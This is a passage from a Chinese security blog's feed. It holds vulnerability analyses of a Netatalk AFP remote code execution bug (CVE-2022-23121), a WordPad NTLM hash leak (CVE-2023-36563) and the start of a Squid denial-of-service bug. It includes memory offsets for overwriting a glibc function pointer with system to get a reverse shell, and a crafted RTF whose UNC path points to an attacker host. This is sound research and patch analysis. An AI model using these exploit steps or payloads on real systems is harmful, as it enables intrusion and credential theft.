&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在
&lt;a href="https://code.woboq.org/userspace/glibc/elf/dl-open.c.html" target="_blank">https://code.woboq.org/userspace/glibc/elf/dl-open.c.html&lt;/a> 可以看到&lt;code>_dl_open&lt;/code>函数源码，该处为&lt;code>_dl_open&lt;/code>函数试图通过函数指针调用&lt;code>__rtld_lock_lock_recursive&lt;/code>指向的函数并把&lt;code>_dl_load_lock&lt;/code>地址作为指针参数传入该函数内。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>void *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_dl_open &lt;span style="color:#f92672">(&lt;/span>const char *file, int mode, const void *caller_dlopen, Lmid_t nsid,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> int argc, char *argv&lt;span style="color:#f92672">[]&lt;/span>, char *env&lt;span style="color:#f92672">[])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>mode &amp;amp; RTLD_BINDING_MASK&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /* One of the flags must be set. */
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _dl_signal_error &lt;span style="color:#f92672">(&lt;/span>EINVAL, file, NULL, N_&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;invalid mode for dlopen()&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /* Make sure we are alone. */
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __rtld_lock_lock_recursive &lt;span style="color:#f92672">(&lt;/span>GL&lt;span style="color:#f92672">(&lt;/span>dl_load_lock&lt;span style="color:#f92672">))&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>_rtld_global&lt;/code>地址为&lt;code>0x7efeac865060&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ p &amp;amp;_rtld_global
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>struct rtld_global *&lt;span style="color:#f92672">)&lt;/span> 0x7efeac865060 &amp;lt;_rtld_global&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>__rtld_lock_lock_recursive&lt;/code> 函数指针及参数&lt;code>dl_load_lock&lt;/code>均为全局变量&lt;code>_rtld_global&lt;/code>的成员&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/27.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># define GL(name) _rtld_local._##name
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># else
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># define GL(name) _rtld_global._##name
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">定义在&lt;/span>_rtld_local&lt;span style="color:#f92672">=&lt;/span>_rtld_global
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>初始化过的全局变量存放在.data段，在ld.so中.data段的偏移为&lt;code>0x2e060&lt;/code>。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/28.png" />&lt;/p>
&lt;p>此时可以利用任意写将获取到的&lt;code>system&lt;/code>函数地址覆盖到&lt;code>__rtld_lock_lock_recursive&lt;/code> 内，并且将要执行的命令放入&lt;code>_dl_load_lock&lt;/code> 即可造成命令执行。&lt;/p>
&lt;p>&lt;strong>命令执行&lt;/strong>&lt;/p>
&lt;p>此前说过任意写是将&lt;code>map + ad.ADEID_RFORK.off&lt;/code> 处长为&lt;code>ad.ADEID_RFORK.len&lt;/code>的数据写入到&lt;code>map + ad.ADEID_FINDERI.off + 0x20&lt;/code> 内，而在分配大小小于&lt;code>0x1000&lt;/code>情况下，&lt;code>mmap&lt;/code>函数分配的内存刚好在&lt;code>data&lt;/code>段上面，此时&lt;code>mmap&lt;/code>分配的内存地址距离要覆盖的&lt;code>_dl_load_lock&lt;/code> 参数为&lt;code>0x2968&lt;/code>，以此可得&lt;code>ad.ADEID_FINDERI.off=0x2940&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>__rtld_lock_recursive_t *&lt;span style="color:#f92672">)&lt;/span> 0x7efeac865968 &amp;lt;_rtld_global+2312&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p &amp;amp;_rtld_global._dl_load_lock Quit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p 0x7efeac865968 - 0x7efeac863000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$8 &lt;span style="color:#f92672">=&lt;/span> 0x2968
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同时还要覆盖到&lt;code>__rtld_lock_lock_recursive&lt;/code> 函数指针，测算可得至少需要复制&lt;code>0x600&lt;/code>的长度才能覆盖到函数指针，此处可以设置复制长度为0x620&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ p &amp;amp;_rtld_global._dl_rtld_lock_recursive
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>void &lt;span style="color:#f92672">(&lt;/span>**&lt;span style="color:#f92672">)(&lt;/span>void *&lt;span style="color:#f92672">))&lt;/span> 0x7efeac865f68 &amp;lt;_rtld_global+3848&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p 0x7efeac865f68 - 0x7efeac863000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$11 &lt;span style="color:#f92672">=&lt;/span> 0x2f68
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p 0x2f68 - 0x2968
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$12 &lt;span style="color:#f92672">=&lt;/span> 0x600
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用上述偏移，加上计算得到的&lt;code>system&lt;/code>函数地址，生成可用文件，如下：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/29.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/30.png" />&lt;/p>
&lt;p>此时在目标主机内已有了该定时任务，在攻击机上监听2333端口即可收到反弹的&lt;code>shell&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/31.png" />&lt;/p>
&lt;h3 id="补丁分析">补丁分析&lt;/h3>
&lt;p>在Netatalk3.1.13版本中修复了该漏洞，在新版本中，先检查if中的条件而后给ad指向的结构体赋值，如果if中条件为真，也就是可能发生了越界则直接打印错误消息而后return -1，只有if条件不满足才继续赋值，从而防止了adouble结构体含有不正确的偏移，在外层函数获取到的偏移在范围内从而修复了该漏洞。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/32.png" />&lt;/p>
&lt;h3 id="函数解释">函数解释&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">memmove&lt;/span> (&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#f92672">*&lt;/span>__dest, &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#f92672">*&lt;/span>__src, size_t __n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// dest指向要复制的目标内存，src指向要复制的数据内存，n为要复制的大小（字节）
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 如果dest和src指向的内存重叠，该函数仍然可以正常处理，逻辑如下
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> str[] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;memmove can be very useful......&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>memmove (str&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>,str&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span>,&lt;span style="color:#ae81ff">11&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出为 memmove can be very very useful.
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/72fq1gp2.bmp" />&lt;/p>
&lt;h3 id="参考链接">参考链接&lt;/h3>
&lt;blockquote>
&lt;p>
&lt;a href="https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open" target="_blank">https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/" target="_blank">https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-11-23T10:46:28+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-36563 Wordpad Info Disclosure 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</link><pubDate>Tue, 31 Oct 2023 17:12:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>windows 10 21h2 2023-09补丁&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞
&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/">CVE-2023-23397 outlook 权限提升漏洞&lt;/a>，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。&lt;/p>
&lt;p>&lt;strong>补丁diff&lt;/strong>&lt;/p>
&lt;p>diff wordpad.exe，可以看到修改了如下函数
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/1.png" />&lt;/p>
&lt;p>同时在修复后的wordpad.exe中新增了QueryConvertOLELinkCallback函数和_LoadImageWithWIC_0，根据微软的函数命名规则，QueryConvertOLELinkCallback可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/2.png" />&lt;/p>
&lt;p>附上AI解释
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/5.png" />&lt;/p>
&lt;p>对比各个修改后的函数，可以看出LoadImageResource为加载Image的资源节里面的资源，不是很符合我们之前的假设
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/3.png" />&lt;/p>
&lt;p>回到补丁新增的函数中，对于新增的函数QueryConvertOLELineCallback，其在CRichEdit2View::OnCreate函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了SendMessageW，目标窗口可以取出这个回调函数指针并调用&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/4.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/6.png" />&lt;/p>
&lt;p>分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。
ole对象相关功能由ole32.dll实现，diff ole32.dll，主要修改了如下函数&lt;/p>
&lt;ul>
&lt;li>OLESTREAMToGenericObject&lt;/li>
&lt;li>wConvertOLESTREAMToIStorage&lt;/li>
&lt;li>OleConvertOLESTREAMToIStorage&lt;/li>
&lt;li>OleConvertOLESTREAMToIStorageEx
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/7.png" />&lt;/li>
&lt;/ul>
&lt;p>新增了如下函数&lt;/p>
&lt;ul>
&lt;li>IsAppExcludedFromOLELinkConversionRegistrySetting&lt;/li>
&lt;li>CheckOLELinkConversionRegistrySetting&lt;/li>
&lt;li>FindStringInMultiString&lt;/li>
&lt;li>OleConvertOLESTREAMToIStorage2&lt;/li>
&lt;li>OleConvertOLESTREAMToIStorageEx2
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/10.png" />&lt;/li>
&lt;/ul>
&lt;p>在OLESTREAMToGenericObject函数diff中可以看到调用了wordpad中传递的函数指针QueryConvertOLELineCallback，并使用PrependUNCName将szUNC添加UNC路径后赋给a2-&amp;gt;m_szTopic。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/9.png" />&lt;/p>
&lt;p>因此可以得出结论：该漏洞是将ole对象的m_szTopic作为UNC路径进行访问。&lt;/p>
&lt;p>谷歌搜索OLESTREAMToGenericObject，在其他安全研究员发表的
&lt;a href="https://ti.qianxin.com/blog/articles/cve-2017-11882-exploit-kit-sample/" target="_blank">其他ole漏洞分析&lt;/a>中看到了如下&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/8.png" />&lt;/p>
&lt;p>OLE格式可以在
&lt;a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-OLEDS/%5bMS-OLEDS%5d.pdf" target="_blank">OLD微软官方文档&lt;/a>中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/11.png" />&lt;/p>
&lt;p>根据
&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oleds/ce565b68-101d-4af3-88fa-39c28d79fc11#gt_cfc45e76-9219-4c47-9ef2-5832a172f795" target="_blank">微软文档&lt;/a>，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>linked object&lt;/strong>: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.&lt;/p>
&lt;/blockquote>
&lt;p>通过wordpad创建一个rtf文件并嵌入ole对象，使用编辑器打开可以看到如下，根据文档可知该ole对象类型为EmbedObject&lt;/p>
&lt;pre tabindex="0">&lt;code>{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \&amp;#39;cb\&amp;#39;ce\&amp;#39;cc\&amp;#39;e5;}}
{\*\generator Riched20 10.0.19041}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052 fff{\object\objemb{\*\objclass PBrush}\objw2835\objh2835{\*\objdata
01050000
02000000
07000000
50427275736800
00000000
00000000
a0a30100
424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000
000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
&lt;/code>&lt;/pre>&lt;p>下载
&lt;a href="https://github.com/decalage2/oletools" target="_blank">ole tools&lt;/a>，查看wordpad生成的rtf文件信息&lt;/p>
&lt;pre tabindex="0">&lt;code>➜ rtfobj.exe .\test.rtf
rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
File: &amp;#39;.\\test.rtf&amp;#39; - size: 661865 bytes
---+----------+---------------------------------------------------------------
id |index |OLE Object
---+----------+---------------------------------------------------------------
0 |00000118h |format_id: 2 (Embedded)
| |class name: b&amp;#39;PBrush&amp;#39;
| |data size: 107424
| |MD5 = &amp;#39;6eb1e875d3759af5e4b65cd324182471&amp;#39;
---+----------+---------------------------------------------------------------
&lt;/code>&lt;/pre>&lt;p>我们知道Topic属性是触发漏洞的关键，通过查看ole文档找到了关键信息，如果LinkedObject包含了ObjectHeader结构，则TopicName必须包含指向链接的文件路径，这个路径必须是绝对路径或者是UNC路径
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/12.png" />&lt;/p>
&lt;p>所以我们可以将UNC路径设置为我们的恶意服务器，重新构造rtf文件，成功触发&lt;/p>
&lt;pre tabindex="0">&lt;code>{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \&amp;#39;cb\&amp;#39;ce\&amp;#39;cc\&amp;#39;e5;}}
{\*\generator Riched20 10.0.19041}{\*\mmathPr\mdispDef1\mwrapIndent1440 }\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052{\object\objemb{\*\objclass Word.Document.8}\objw585\objh795{\*\objdata
01050000
01000000
10000000
576f72642e446f63756d656e742e3800
17000000
5c5c3139322e3136382e35322e3135365c312e72746600
00000000
00000000
00000000
00000000
01050000
05000000
10000000
576f72642e446f63756d656e742e3800
0e000000
74400000
0100090000033a20000009001610000000001610000026060f002220574d464301000000000001
&lt;/code>&lt;/pre>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/14.png" />
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/13.png" />&lt;/p>
&lt;p>注意到即使设置了MotW，虽然wordpad会显示警告，但仍然会访问Topic指向的资源，在procmonitor中可以看到如下事件
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/15.png" />&lt;/p>
&lt;p>&lt;strong>补丁和缓解措施分析&lt;/strong>&lt;/p>
&lt;p>微软在补丁日后发布了
&lt;a href="https://support.microsoft.com/en-us/topic/kb5032314-how-to-manage-the-ole-object-conversion-vulnerability-associated-with-cve-2023-36563-98d95ae9-2f9e-4f65-9231-46363c31cf07" target="_blank">一篇文章&lt;/a>，指出可以在 &lt;code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\OLELinkConversionFromOLESTREAMToIStorage&lt;/code>中添加DWORD的Disabled值0x00000001来禁用，但我在win 10 21h2 9月补丁中应用了此方法，但不起作用，wordpad没有读取这个注册表。打开文件后仍然访问了UNC路径，泄露了NTLM hash&lt;/p>
&lt;p>在前文补丁分析中已知，wordpad会传递回调函数给ole32一个回调函数，在ole32中，会先检查注册表是否禁用了ole对象链接转换，而后检查当前进程是否在白名单内，最后而后调用用户提供的回调函数，以运行用户自定义的规则。&lt;/p>
&lt;p>&lt;strong>PoC构造&lt;/strong>&lt;/p>
&lt;p>打开wordpad，插入一个rtf对象，而后将Topic的长度和name字段替换为UNC路径即可，稍晚俩天poc会公布在我的GitHub&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/Chestnuts4/POC
&lt;/code>&lt;/pre>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞和预想中一样，是由于某个属性可以被设置为UNC路径，而后wordpad会访问这个UNC路径，虽然文件设置了MotW标识，wordpad显示了警告，但反常的是wordpad仍然在用户没有同意的情况下访问了目标UNC路径，这一点比较反直觉。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/" target="_blank">https://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/" target="_blank">https://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-10-31T17:12:19+08:00&lt;/strong>&lt;/p></description></item><item><title>Squid 拒绝服务漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</link><pubDate>Thu, 26 Oct 2023 10:41:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>开启了digest身份认证的squid代理服务器存在堆溢出漏洞，未经身份验证的攻击者可以利用该漏洞造成拒绝服务。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>hunter&lt;/p>
&lt;pre tabindex="0">&lt;code>web.title=&amp;#34;ERROR The requested URL could not be retrieved&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>squid&lt;/p>
&lt;pre tabindex="0">&lt;code>3.2.0.1-5.9, 6.0-6.3
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>按照configure脚本的提示安装各个依赖，而后执行如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>export C_INCLUDE_PATH&lt;span style="color:#f92672">=&lt;/span>/usr/include/libxml2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>export CPLUS_INCLUDE_PATH&lt;span style="color:#f92672">=&lt;/span>/usr/include/libxml2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./configure &lt;span style="color:#e6db74">&amp;#39;--build=x86_64-linux-gnu&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--prefix=/root/squid/squid-6.3/build&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--includedir=${prefix}/include&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--mandir=${prefix}/share/man&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--infodir=${prefix}/share/info&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--sysconfdir=/etc&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--localstatedir=/var&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-option-checking&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-silent-rules&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--libdir=${prefix}/lib/x86_64-linux-gnu&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--runstatedir=/run&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-maintainer-mode&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-dependency-tracking&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now &amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;BUILDCXX=g++&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-build-environment=default&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-build-info=Debian linux&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--datadir=/usr/share/squid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--sysconfdir=/etc/squid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--libexecdir=/usr/lib/squid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--mandir=/usr/share/man&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-inline&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-arch-native&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-async-io=8&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-storeio=ufs,aufs,diskd,rock&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-removal-policies=lru,heap&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-delay-pools&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-icap-client&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-follow-x-forwarded-for&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-auth-digest=file,LDAP&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-auth-negotiate=wrapper&amp;#39;&lt;/span> &lt;span 